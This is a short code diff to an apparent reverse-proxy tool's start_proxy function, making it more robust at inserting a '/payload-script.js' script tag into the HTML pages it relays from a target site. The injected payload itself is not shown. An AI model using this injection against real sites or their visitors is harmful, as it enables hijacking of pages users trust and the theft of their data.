@@ -393,9 +393,17 @@ def start_proxy(target, host, port, secret):
             # Inject payload if HTML
             response = resp.content
             if 'text/html' in resp.headers.get('Content-Type', ''):
-                response = response.decode('utf-8')
-                response = response.replace('</head>', '<script src="/payload-script.js"></script></head>')
-                response = response.encode('utf-8')
+                try:
+                    response = response.decode('utf-8')
+                    if '</head>' in response:
+                        payload = '<script src="/payload-script.js"></script>'
+                        response = response.replace('</head>', f'{payload}</head>')
+                    elif '<body>' in response:
+                        payload = '<script src="/payload-script.js"></script>'
+                        response = response.replace('<body>', f'<body>{payload}')
+                    response = response.encode('utf-8')
+                except UnicodeDecodeError:
+                    pass  # Skip injection if we can't decode the response
 
             return Response(response, resp.status_code, headers)
 
